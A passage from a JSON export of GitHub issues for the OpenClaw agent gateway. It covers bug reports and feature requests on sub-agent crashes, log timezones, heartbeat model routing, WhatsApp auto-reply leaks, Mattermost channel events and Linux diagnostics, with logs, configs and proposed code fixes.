'';\n  }\n  return val.trim();\n};\n```\n\n## Additional Context\n- This issue appears regardless of agent model (Anthropic vs OpenAI)\n- Main session agents with `workspace: null` work fine (issue only affects sub-agents)\n- The bug is reproducible 100% of the time with the config shown above\n- Removing the `workspace` property entirely resolves the issue completely\n\n## Impact\n- **Severity**: Critical - Completely breaks sub-agent functionality\n- **Workaround Available**: ❌ No - All attempted solutions fail\n- **User Experience**: Poor - Cryptic error message, no indication of root cause\n- **Blocking**: Users cannot use opus/codex sub-agents for code review, complex tasks, etc.\n- **Reproducibility**: 100% - Every spawn attempt fails identically",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12888",
      "createdAt": "2026-02-09T21:33:04Z",
      "updatedAt": "2026-02-11T13:24:39Z",
      "author": "maartenhendrix",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3881378292,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12888#issuecomment-3881378292",
          "createdAt": "2026-02-11T00:06:46Z",
          "updatedAt": "2026-02-11T00:06:46Z",
          "author": "joshp123",
          "body": "codex 5.3 doesn't agree that this is the correct identification, can you share stacktraces or more info? or debug locally further with a codex model?"
        },
        {
          "id": 3884420988,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12888#issuecomment-3884420988",
          "createdAt": "2026-02-11T13:23:03Z",
          "updatedAt": "2026-02-11T13:24:39Z",
          "author": "maartenhendrix",
          "body": "Confirmed: issue still reproducible, and gateway logs consistently point to a subagent-lane failure (undefined.trim) rather than model output.\n\nRepro pattern (consistent)\n\nFor failing subagent runs, the sequence is:\n\n1. embedded run start (subagent run starts normally)\n2. lane task error: lane=subagent ... TypeError: Cannot read properties of undefined (reading 'trim')\n3. lane task error: lane=session:agent:...:subagent:... ... TypeError: Cannot read properties of undefined (reading 'trim')\n4. Gateway returns agent errorCode=UNAVAILABLE ... trim\nThis happens very quickly after subagent start (typically within tens of ms in earlier captures), and reproduces across models (Opus/Sonnet), including serialized subagent execution.\n\nGateway logs evidence\n\nExamples observed in ~/.openclaw/logs/gateway.log:\n\n• embedded run start: runId=b55c95f1-bda3-4253-8e14-c9ddfd7542f3 ... provider=anthropic model=claude-opus-4-6 ...\n• Followed by:  • lane task error: lane=subagent ... TypeError: Cannot read properties of undefined (reading 'trim')\n  • lane task error: lane=session:agent:sonnet:subagent:... ... TypeError: Cannot read properties of undefined (reading 'trim')\n  • agent errorCode=UNAVAILABLE ... trim\n\nThis is what the gateway logging shows:\n``` \n{\"0\":\"{\\\"subsystem\\\":\\\"agent/embedded\\\"}\",\"1\":\"embedded run start: runId=4b3514ea-a28e-4f7f-9502-c9cfb488780e sessionId=1b36def7-5905-49d3-ac12-a3e58079aa9f provider=anthropic model=claude-opus-4-5 thinking=low messageChannel=telegram\",\"_meta\":{\"runtime\":\"node\",\"runtimeVersion\":\"22.22.0\",\"hostname\":\"unknown\",\"name\":\"{\\\"subsystem\\\":\\\"agent/embedded\\\"}\",\"parentNames\":[\"openclaw\"],\"date\":\"2026-02-07T12:05:24.689Z\",\"logLevelId\":2,\"logLevelName\":\"DEBUG\",\"path\":{\"fullFilePath\":\"file:///usr/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js:777:14\",\"fileName\":\"subsystem-CAq3uyo7.js\",\"fileNameWithLine\":\"subsystem-CAq3uyo7.js:777\",\"fileColumn\":\"14\",\"fileLine\":\"777\",\"filePath\":\"/usr/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js\",\"filePathWithLine\":\"/usr/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js:777\",\"method\":\"logToFile\"}},\"time\":\"2026-02-07T12:05:24.690Z\"}\n{\"0\":\"{\\\"subsystem\\\":\\\"diagnostic\\\"}\",\"1\":\"lane task error: lane=subagent durationMs=16 error=\\\"TypeError: Cannot read properties of undefined (reading 'trim')\\\"\",\"_meta\":{\"runtime\":\"node\",\"runtimeVersion\":\"22.22.0\",\"hostname\":\"unknown\",\"name\":\"{\\\"subsystem\\\":\\\"diagnostic\\\"}\",\"parentNames\":[\"openclaw\"],\"date\":\"2026-02-07T12:05:24.704Z\",\"logLevelId\":5,\"logLevelName\":\"ERROR\",\"path\":{\"fullFilePath\":\"file:///usr/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js:777:14\",\"fileName\":\"subsystem-CAq3uyo7.js\",\"fileNameWithLine\":\"subsystem-CAq3uyo7.js:777\",\"fileColumn\":\"14\",\"fileLine\":\"777\",\"filePath\":\"/usr/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js\",\"filePathWithLine\":\"/usr/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js:777\",\"method\":\"logToFile\"}},\"time\":\"2026-02-07T12:05:24.705Z\"}\n{\"0\":\"{\\\"subsystem\\\":\\\"diagnostic\\\"}\",\"1\":\"lane task error: lane=session:agent:codex:subagent:10034675-f4c0-450d-a724-d3b161c79453 durationMs=21 error=\\\"TypeError: Cannot read properties of undefined (reading 'trim')\\\"\",\"_meta\":{\"runtime\":\"node\",\"runtimeVersion\":\"22.22.0\",\"hostname\":\"unknown\",\"name\":\"{\\\"subsystem\\\":\\\"diagnostic\\\"}\",\"parentNames\":[\"openclaw\"],\"date\":\"2026-02-07T12:05:24.706Z\",\"logLevelId\":5,\"logLevelName\":\"ERROR\",\"path\":{\"fullFilePath\":\"file:///usr/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js:777:14\",\"fileName\":\"subsystem-CAq3uyo7.js\",\"fileNameWithLine\":\"subsystem-CAq3uyo7.js:777\",\"fileColumn\":\"14\",\"fileLine\":\"777\",\"filePath\":\"/usr/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js\",\"filePathWithLine\":\"/usr/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js:777\",\"method\":\"logToFile\"}},\"time\":\"2026-02-07T12:05:24.706Z\"}\n{\"0\":\"{\\\"subsystem\\\":\\\"gateway/ws\\\"}\",\"1\":\"⇄ res ✗ agent errorCode=UNAVAILABLE errorMessage=TypeError: Cannot read properties of undefined (reading 'trim') runId=4b3514ea-a28e-4f7f-9502-c9cfb488780e error=TypeError: Cannot read properties of undefined (reading 'trim') conn=ae487eda…1338 id=8294f917…bed3\",\"_meta\":{\"runtime\":\"node\",\"runtimeVersion\":\"22.22.0\",\"hostname\":\"unknown\",\"name\":\"{\\\"subsystem\\\":\\\"gateway/ws\\\"}\",\"parentNames\":[\"openclaw\"],\"date\":\"2026-02-07T12:05:24.713Z\",\"logLevelId\":3,\"logLevelName\":\"INFO\",\"path\":{\"fullFilePath\":\"file:///usr/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js:777:14\",\"fileName\":\"subsystem-CAq3uyo7.js\",\"fileNameWithLine\":\"subsystem-CAq3uyo7.js:777\",\"fileColumn\":\"14\",\"fileLine\":\"777\",\"filePath\":\"/usr/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js\",\"filePathWithLine\":\"/usr/lib/node_modules/openclaw/dist/subsystem-CAq3uyo7.js:777\",\"method\":\"logToFile\"}},\"time\":\"2026-02-07T12:05:24.714Z\"}\n``` \nAlso important: normal main-lane runs continue to complete successfully after these failures, which suggests a subagent orchestration/lane-specific bug.\n\nAdditional notes\n\n• No full stack trace is emitted yet in current logs (errors appear flattened to string form in current runtime output).\n• messageChannel=telegram appears normal in valid embedded run start lines and does not appear to be the root cause."
        }
      ]
    },
    {
      "number": 12447,
      "title": "[Bug] openclaw logs shows UTC time instead of local timezone",
      "body": "## 问题描述\n`openclaw logs --follow` 命令输出的时间戳始终使用 UTC 时区，无法根据系统 TZ 设置显示本地时间。\n\n## 环境\n- OS: Linux (Ubuntu/arm64)\n- TZ: Asia/Shanghai (已配置)\n- 服务端 TZ 已生效，但 logs 命令仍显示 UTC\n\n## 原因\n`dist/logs-cli-*.js` 中的 `toISOString()` 硬编码为 UTC 格式：\n```javascript\nif (mode === \"pretty\") return parsed.toISOString().slice(11, 19);\nreturn parsed.toISOString();\n\n时间戳应该尊重系统 TZ 设置（如 Asia/Shanghai），或提供 --timezone 参数。",
      "state": "closed",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12447",
      "createdAt": "2026-02-09T08:05:48Z",
      "updatedAt": "2026-02-11T13:24:10Z",
      "author": "YuShiWei923",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3881689210,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12447#issuecomment-3881689210",
          "createdAt": "2026-02-11T01:56:40Z",
          "updatedAt": "2026-02-11T01:56:40Z",
          "author": "xialonglee",
          "body": "I think it would be convenient to display datetime in the local time zone. We could add an option like --localtime to show local datetime when checking logs. i will try to fix this"
        },
        {
          "id": 3881968719,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12447#issuecomment-3881968719",
          "createdAt": "2026-02-11T03:48:08Z",
          "updatedAt": "2026-02-11T03:48:08Z",
          "author": "victorchoy",
          "body": "surely need this"
        }
      ]
    },
    {
      "number": 14087,
      "title": "[Bug]:Heartbeat model override ignored (always uses primary model)",
      "body": "## Summary\n\nDescription:\n\nIn openclaw.json you can set agents.defaults.heartbeat.model, but in 2026.2.9 the gateway still uses the primary model for heartbeat turns.\nRepro:\nConfigure:\n\"agents\": {\n  \"defaults\": {\n    \"model\": { \"primary\": \"openai/gpt-5.1\" },\n    \"heartbeat\": {\n      \"every\": \"60s\",\n      \"model\": \"ollama/llama3.2:1b\",\n      \"prompt\": \"…\"\n    }\n  }\n}\nRestart gateway.\nObserve:\nOpenAI usage closely tracks every (60s vs 5s),\nollama ps shows no activity during heartbeats,\nso heartbeats are still hitting OpenAI.\nExpected:\nHeartbeat turns should use the model specified in heartbeat.model (resolved via models.providers), so I can offload heartbeats to a cheap local model like Ollama.\nThis matters because heartbeats run frequently and can dominate cost; without heartbeat.model being honored, there is no way in-config to route them to a cheaper model.\n\n## Environment\n\n- Clawdbot version: updated every day\n- OS: MacOS\n- Install method (pnpm/npx/docker/etc):\n\n## Logs or screenshots\n\nPaste relevant logs or add screenshots (redact secrets).\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14087",
      "createdAt": "2026-02-11T13:16:05Z",
      "updatedAt": "2026-02-11T13:16:05Z",
      "author": "Gogo6969",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "docker"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 14076,
      "title": "Feature request: read-only allowlist / suppress auto-reply for WhatsApp DMs",
      "body": "## Problem\n\nWhen using WhatsApp with `dmPolicy: \"allowlist\"`, adding a phone number to `allowFrom` makes that contact a **full conversational partner**. Every agent reply in the session is automatically sent back to the WhatsApp sender via the `web-auto-reply` module, even when the agent is primarily interacting on a different channel (e.g., Telegram).\n\nThis creates an unintended information leak in multi-channel setups.\n\n### Scenario\n\n1. Agent is bound to Telegram (primary channel with the user)\n2. A third-party WhatsApp contact is temporarily added to `allowFrom` so the agent can receive their replies\n3. Third party sends a WhatsApp message — it enters the main session alongside Telegram messages\n4. Agent generates a reply intended for the Telegram user (e.g., analysis, comparison notes)\n5. The `web-auto-reply` module intercepts the reply and **sends it to the WhatsApp contact** as well\n6. The third party sees internal notes, comparisons with competitors, pricing analysis, etc.\n\n### Why this is problematic\n\n- The agent has **no way to suppress** auto-replies to specific contacts\n- The `message` tool correctly blocks cross-context sends (Telegram to WhatsApp), but the gateway-level `web-auto-reply` module bypasses this protection\n- There is no concept of a \"receive-only\" or \"read-only\" allowlist entry\n- The only workaround is to never add third parties to `allowFrom`, which means losing the ability to receive their replies through the gateway\n\n### Observed behavior in logs\n\n```\n[web-auto-reply] inbound web message from +XXXXX\n[web-auto-reply] auto-reply sent (text) to +XXXXX   <-- unintended\n[whatsapp/outbound] Auto-replied to +XXXXX           <-- leaked to third party\n```\n\nEvery reply the agent generates — even ones clearly addressed to the primary user on Telegram — gets duplicated to the WhatsApp sender.\n\n## Proposed solutions\n\n### Option A: Per-number auto-reply suppression\n\nAllow `allowFrom` entries to specify receive-only mode:\n\n```json\n{\n  \"channels\": {\n    \"whatsapp\": {\n      \"allowFrom\": [\n        \"+1234567890\",\n        { \"number\": \"+0987654321\", \"autoReply\": false }\n      ]\n    }\n  }\n}\n```\n\nNumbers with `autoReply: false` would have their messages delivered to the agent session, but the `web-auto-reply` module would skip sending replies back to them.\n\n### Option B: Channel-level auto-reply toggle\n\n```json\n{\n  \"channels\": {\n    \"whatsapp\": {\n      \"autoReply\": false\n    }\n  }\n}\n```\n\nThis would make WhatsApp fully receive-only at the channel level. Outbound messages would only be sent via explicit CLI commands or the message tool.\n\n### Option C: Reply channel tagging\n\nAllow the agent to specify which channel(s) a reply should be delivered to, so the auto-reply module can respect channel targeting.\n\n## Current workaround\n\n- Never add third-party numbers to `allowFrom`\n- Use `openclaw message send --channel whatsapp --target NUMBER --message TEXT` for outbound-only communication\n- Accept that inbound replies from third parties are not received by the agent (must be checked manually on the phone)\n\n## Environment\n\n- OpenClaw v2026.2.9\n- Multi-channel setup: Telegram (primary) + WhatsApp\n- Gateway module: `web-auto-reply`\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14076",
      "createdAt": "2026-02-11T12:50:20Z",
      "updatedAt": "2026-02-11T13:12:20Z",
      "author": "pycckuu",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram",
          "whatsapp"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3884361169,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/14076#issuecomment-3884361169",
          "createdAt": "2026-02-11T13:12:20Z",
          "updatedAt": "2026-02-11T13:12:20Z",
          "author": "pycckuu",
          "body": "## Proposal: Channel-level `autoReply` toggle (generalization of Option B)\n\nAfter digging through the codebase, I think a **channel-level** approach is cleaner and more general than per-number `allowFrom` objects. The core insight: if WhatsApp is being used to collect info from third parties while the primary conversation is on Telegram, the *entire channel* should be receive-only — not individual numbers.\n\n### Proposed config\n\n```json\n{\n  \"channels\": {\n    \"whatsapp\": {\n      \"autoReply\": false,\n      \"dmPolicy\": \"allowlist\",\n      \"allowFrom\": [\"+15551234567\", \"+0987654321\"]\n    }\n  }\n}\n```\n\nAlso supported in `channels.defaults` (global) and per-account (multi-account setups):\n\n```\naccount.autoReply > channel.autoReply > defaults.autoReply > true\n```\n\nThis follows the existing `groupPolicy` / `heartbeat` cascade pattern already in the codebase.\n\n### What happens at runtime\n\n1. WhatsApp contact sends message → passes `allowFrom` → **allowed**\n2. Message enters agent session → LLM processes it → response generated (preserved in session context)\n3. `deliver` callback sees `autoReply: false` → **skips `deliverWebReply()`** → nothing sent to WhatsApp\n4. Agent on Telegram sees the WhatsApp message in the shared session (with `dmScope: \"main\"`)\n5. Agent can still **explicitly send** to WhatsApp via `message` tool — that path (`message-action-runner.ts` → `sendMessageWhatsApp`) is completely separate from auto-reply\n\n### Why channel-level over per-number\n\n- Simpler to configure — one flag vs annotating every number\n- Matches the real use case: \"WhatsApp is for data collection, not conversation\"\n- General — works for any channel (Telegram, Signal, etc.), not just WhatsApp\n- Per-number overrides can be layered on later if needed\n\n### Implementation scope\n\n~9 files, follows existing patterns:\n- Add `autoReply?: boolean` to `ChannelDefaultsConfig`, `WhatsAppConfig`, `WhatsAppAccountConfig`\n- New `resolveAutoReplyEnabled()` resolver (following `resolveHeartbeatVisibility` pattern)\n- Check `suppressAutoReply` in `process-message.ts` deliver callback\n- Zod schema updates for validation\n\nHappy to open a PR for this. cc @gumadeiras @cpojer"
        }
      ]
    },
    {
      "number": 11797,
      "title": "[Bug]: Mattermost plugin does not receive channel message events via WebSocket",
      "body": "## Environment\n- OpenClaw version: `2026.2.6-3`\n- Mattermost plugin: bundled (from `extensions/mattermost`)\n- Mattermost server: Team Edition (latest), Docker, self-hosted\n- Setup: Local bot account with valid token, added to team and channels\n\n## Expected behavior\nWhen `chatmode: \"onmessage\"` is configured, the bot should respond to all messages in channels where it is a member.\n\n## Actual behavior\n- **DMs work perfectly:** Bot receives and responds to direct messages via WebSocket\n- **Channels do NOT work:** Bot never receives channel message events, even when:\n  - Bot is confirmed as channel member (verified via API: `/api/v4/channels/{channel_id}/members`)\n  - `chatmode: \"onmessage\"` is set\n  - User @mentions the bot in the channel\n\n## Logs\nGateway logs show only DM deliveries:\n\ninfo gateway/channels/mattermost delivered reply to user:e5wazhpapif8jkkt3njkjhwjka\n\nNo channel events (`posted` events for channels) appear in logs, even when messages are sent to channels where the bot is a member.\n\n## Config\n```json\n{\n  \"channels\": {\n    \"mattermost\": {\n      \"botToken\": \"***\",\n      \"baseUrl\": \"http://localhost:8065\",\n      \"dmPolicy\": \"open\",\n      \"groupPolicy\": \"allowlist\",\n      \"chatmode\": \"onmessage\",\n      \"groupAllowFrom\": [\"xuurfxh3c7fy7xazyy87dme3mc\"]\n    }\n  }\n}\n````\n\n## Investigation\n* Bot successfully connects to Mattermost WebSocket\n* Bot user ID: 9ge9hwz6q7ndzcwprayt1tiwqo\n* Bot is member of channel xuurfxh3c7fy7xazyy87dme3mc (verified via API)\n* Channel posts exist and are visible via API (/api/v4/channels/{id}/posts)\n# Hypothesis\nThe Mattermost plugin may not be subscribing to channel events via WebSocket, or the WebSocket handler filters out non-DM events.\n\nWorkaround\nDMs work fine, so users can interact via direct messages.",
      "state": "open",
      "comments": 6,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/11797",
      "createdAt": "2026-02-08T09:57:09Z",
      "updatedAt": "2026-02-11T13:02:28Z",
      "author": "Neelin",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "docker"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3867016238,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11797#issuecomment-3867016238",
          "createdAt": "2026-02-08T11:13:27Z",
          "updatedAt": "2026-02-08T11:13:27Z",
          "author": "stephen1137",
          "body": "We can confirm this issue. Same Mattermost server (Team Edition, self-hosted), same OpenClaw version (2026.2.6-3), two separate instances — one works, one does not.\n\n**Working instance:**\n- `chatmode: \"oncall\"`\n- No `groupPolicy`, no `requireMention` set\n- Channel messages received via WebSocket ✅\n\n**Broken instance:**\n- `chatmode: \"onmessage\"`\n- `groupPolicy: \"open\"`, `requireMention: false`, `groups: {\"*\": {\"requireMention\": false}}`\n- DMs work perfectly, channel messages never received ❌\n\nBoth bots are confirmed members of their respective channels (verified via Mattermost API). Same server, same OpenClaw version, different configs.\n\nThe working instance uses `chatmode: \"oncall\"` with minimal group config. The broken instance has explicit `groupPolicy: \"open\"` and `requireMention: false` — which ironically seems to prevent channel events from arriving.\n\nWorkaround for now: using the working instance for channel monitoring."
        },
        {
          "id": 3867437344,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11797#issuecomment-3867437344",
          "createdAt": "2026-02-08T15:49:23Z",
          "updatedAt": "2026-02-08T15:49:23Z",
          "author": "hnykda",
          "body": "Confirm, exactly same behavior."
        },
        {
          "id": 3876088577,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11797#issuecomment-3876088577",
          "createdAt": "2026-02-10T08:23:27Z",
          "updatedAt": "2026-02-10T08:23:27Z",
          "author": "drdanielbender",
          "body": "With `chatmode: \"onmessage\"`, I also get no response from the bot in a group, unless I mention the bot via @botname.\n\nNot the intended behavior, but maybe this info helps to identify the problem."
        },
        {
          "id": 3883496996,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11797#issuecomment-3883496996",
          "createdAt": "2026-02-11T10:17:22Z",
          "updatedAt": "2026-02-11T10:26:39Z",
          "author": "hnykda",
          "body": "Traced this to `monitor.ts` — `resolveRequireMention()` (line ~602) doesn't receive the account-level `requireMention` setting (which correctly maps `chatmode: \"onmessage\"` → `false`), so it defaults to `true`. Messages are ingested as context but don't trigger responses.\n\n**Config workaround** (no code change needed):\n```json\n{\n  \"channels\": {\n    \"mattermost\": {\n      \"chatmode\": \"onmessage\",\n      \"groups\": {\n        \"<channel_id>\": { \"requireMention\": false }\n      }\n    }\n  }\n}\n```\nSet per-channel to avoid responding to every message everywhere. "
        },
        {
          "id": 3884163455,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11797#issuecomment-3884163455",
          "createdAt": "2026-02-11T12:37:11Z",
          "updatedAt": "2026-02-11T12:37:11Z",
          "author": "drdanielbender",
          "body": "> Traced this to `monitor.ts` — `resolveRequireMention()` (line ~602) doesn't receive the account-level `requireMention` setting (which correctly maps `chatmode: \"onmessage\"` → `false`), so it defaults to `true`. Messages are ingested as context but don't trigger responses.\n> \n> **Config workaround** (no code change needed):\n> \n> {\n>   \"channels\": {\n>     \"mattermost\": {\n>       \"chatmode\": \"onmessage\",\n>       \"groups\": {\n>         \"<channel_id>\": { \"requireMention\": false }\n>       }\n>     }\n>   }\n> }\n> \n> Set per-channel to avoid responding to every message everywhere.\n\nWorks like a charm. Thank you, @hnykda, but why did you close the merge-request you created to make the \"onmessage\" setting work as intended?"
        },
        {
          "id": 3884307614,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11797#issuecomment-3884307614",
          "createdAt": "2026-02-11T13:02:28Z",
          "updatedAt": "2026-02-11T13:02:28Z",
          "author": "hnykda",
          "body": "I... didn't tested it properly... And don't want to pollute the commons with slop."
        }
      ]
    },
    {
      "number": 14084,
      "title": "Linux: Doctor diagnostics significantly thinner than macOS",
      "body": "## Problem\n\nThe `openclaw doctor` command has substantially deeper diagnostics and auto-repair on macOS than on Linux:\n\n### macOS gets:\n- LaunchAgent bootstrap repair (`maybeRepairLaunchAgentBootstrap`)\n- `launchctl getenv` override detection for gateway tokens/passwords\n- Deprecated `MOLTBOT_*`/`CLAWDBOT_*` env var detection via launchctl\n- Plist file health checks\n- LaunchAgent loaded-but-not-running detection and auto-fix\n\n### Linux gets:\n- systemd unit existence check\n- Linger prompt\n- journalctl hint when stopped\n- ...that is basically it\n\n### Missing Linux equivalents:\n- **Stale systemd unit detection** — unit file exists but references a moved/updated binary path\n- **Environment variable conflicts** — `Environment=` lines in the unit file that conflict with config\n- **Unit file drift** — the installed unit doesn't match what `openclaw gateway install` would currently generate (e.g., after an update)\n- **Socket activation issues** — common systemd footgun\n- **Service restart loop detection** — checking `systemctl --user show` for `NRestarts` / recent failures\n- **Auto-repair flow** — macOS has `maybeRepairLaunchAgentBootstrap`; Linux has no equivalent repair prompt\n\n## Impact\n\nWhen things go wrong on Linux, `openclaw doctor` provides less help than on macOS. The asymmetry contributes to the perception that Linux is a second-class platform.\n\n## Suggested Additions\n\n1. Compare installed unit ExecStart against what would be generated now → prompt to reinstall if drifted\n2. Check `systemctl --user show SERVICE --property=NRestarts,Result` → warn on crash loops\n3. Parse `Environment=` lines from unit file → warn on conflicts with config\n4. Check unit file permissions (should be 644)\n5. Verify the node/bun binary in ExecStart actually exists and is executable\n\n## Where in Code\n\n- `dist/doctor-*.js` — main doctor flow, `buildGatewayRuntimeHints()`\n- `dist/systemd-*.js` — systemd-specific operations\n\n## Environment\n\n- OpenClaw v2026.2.9\n- Linux with systemd",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14084",
      "createdAt": "2026-02-11T12:57:51Z",
      "updatedAt": "2026-02-11T12:57:51Z",
      "author": "holistic-medical-supply-base",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 14083,
      "title": "Linux: Port diagnostics should fall back to `ss` when `lsof` is missing",
      "body": "## Problem\n\nPort conflict diagnostics use `lsof -nP -iTCP:PORT -sTCP:LISTEN` to identify what process owns a port. When `lsof` is not installed (common on minimal Linux servers, containers, and cloud VMs), the fallback is a generic socket bind test that reports \"Port is in use but process details are unavailable (install lsof or run as an admin user).\"\n\n## Impact\n\nUsers get unhelpful diagnostics on minimal Linux installs. They know the port is busy but not what is using it — the most critical piece of information for debugging.\n\n## Suggested Fix\n\nFall back to `ss -tlnp` which is part of `iproute2` — installed on virtually every Linux system:\n\n```javascript\nasync function readUnixListeners(port) {\n  // Try lsof first\n  const lsofResult = await tryLsof(port);\n  if (lsofResult.listeners.length > 0) return lsofResult;\n  \n  // Fallback: ss (iproute2, nearly universal on Linux)\n  if (process.platform === \"linux\") {\n    const ssResult = await runCommandSafe([\"ss\", \"-tlnp\", `sport = :${port}`]);\n    if (ssResult.code === 0) {\n      return parseSsOutput(ssResult.stdout, port);\n    }\n  }\n  \n  return lsofResult; // return whatever lsof gave us\n}\n```\n\n`ss` output includes PID and process name, providing the same diagnostic value as `lsof`.\n\n## Where in Code\n\n- `dist/chrome-*.js` — `readUnixListeners()` function, `LSOF_CANDIDATES` constant\n\n## Environment\n\n- OpenClaw v2026.2.9\n- Linux without `lsof` installed",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14083",
      "createdAt": "2026-02-11T12:57:34Z",
      "updatedAt": "2026-02-11T12:57:34Z",
      "author": "holistic-medical-supply-base",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": []
      }
    },
    {
      "number": 14082,
      "title": "Linux: Browser detection misses Flatpak-installed browsers",
      "body": "## Problem\n\n`findChromeExecutableLinux()` checks hardcoded paths:\n- `/usr/bin/google-chrome*`\n- `/usr/bin/brave*`, `/usr/bin/chromium*`\n- `/snap/bin/brave`, `/snap/bin/chromium`\n\nMissing entirely: **Flatpak-installed browsers**, which are increasingly common on Fedora, Ubuntu, and other distros that ship Flatpak by default.\n\n## Flatpak Paths to Add\n\n```\n/var/lib/flatpak/exports/bin/com.google.Chrome\n/var/lib/flatpak/exports/bin/com.brave.Browser\n/var/lib/flatpak/exports/bin/org.chromium.Chromium\n/var/lib/flatpak/exports/bin/com.microsoft.Edge\n~/.local/share/flatpak/exports/bin/com.google.Chrome\n~/.local/share/flatpak/exports/bin/com.brave.Browser\n~/.local/share/flatpak/exports/bin/org.chromium.Chromium\n```\n\n## Also Missing\n\nThe `detectDefaultChromiumExecutableLinux()` function reads `.desktop` files to find the system default browser. It checks:\n- `~/.local/share/applications/`\n- `/usr/local/share/applications/`\n- `/usr/share/applications/`\n- `/var/lib/snapd/desktop/applications/`\n\nMissing: `/var/lib/flatpak/exports/share/applications/` and `~/.local/share/flatpak/exports/share/applications/`\n\n## Impact\n\nUsers who install Chrome/Brave/Chromium via Flatpak (common on Fedora Silverblue, elementary OS, and increasingly Ubuntu) get \"No supported browser found\" errors.\n\n## Where in Code\n\n- `dist/chrome-*.js` — `findChromeExecutableLinux()` and `findDesktopFilePath()`\n\n## Environment\n\n- OpenClaw v2026.2.9\n- Linux with Flatpak-installed browsers",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14082",
      "createdAt": "2026-02-11T12:57:21Z",
      "updatedAt": "2026-02-11T12:57:21Z",
      "author": "holistic-medical-supply-base",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": []
      }
    },
    {
      "number": 14081,
      "title": "Linux: moveToTrash() has no fallback beyond `trash` command",
      "body": "## Problem\n\n`moveToTrash()` only tries the `trash` command (from `trash-cli`). If it fails, the function logs \"Failed to move to Trash (manual delete)\" and silently continues.\n\nOn most minimal Linux installs, `trash-cli` is not installed. However, `gio` (from GLib, installed with most desktop environments) provides `gio trash` which is more commonly available.\n\n## Impact\n\n`openclaw reset` and other trash operations silently fail on Linux systems without `trash-cli`, leaving files in place with only a log message.\n\n## Suggested Fix\n\nTry multiple trash commands in order:\n\n```javascript\nasync function moveToTrash(pathname, runtime) {\n  const commands = [\n    [\"trash\", pathname],           // trash-cli\n    [\"gio\", \"trash\", pathname],    // GLib/GNOME\n    [\"trash-put\", pathname],       // trash-cli alternative name\n  ];\n  for (const cmd of commands) {\n    try {\n      await runCommandWithTimeout(cmd, { timeoutMs: 5000 });\n      runtime.log(`Moved to Trash: ${shortenHomePath(pathname)}`);\n      return;\n    } catch { continue; }\n  }\n  // Final fallback: move to XDG trash manually\n  const trashDir = path.join(os.homedir(), \".local/share/Trash/files\");\n  // ... mkdir + move\n}\n```\n\n## Where in Code\n\n- `dist/loader-*.js` — `moveToTrash()` function (around line 55310)\n\n## Environment\n\n- OpenClaw v2026.2.9\n- Linux without `trash-cli` installed",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14081",
      "createdAt": "2026-02-11T12:57:09Z",
      "updatedAt": "2026-02-11T12:57:09Z",
      "author": "holistic-medical-supply-base",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": []
      }
    },
    {
      "number": 14080,
      "title": "Linux: Chrome on Wayland missing --ozone-platform flag",
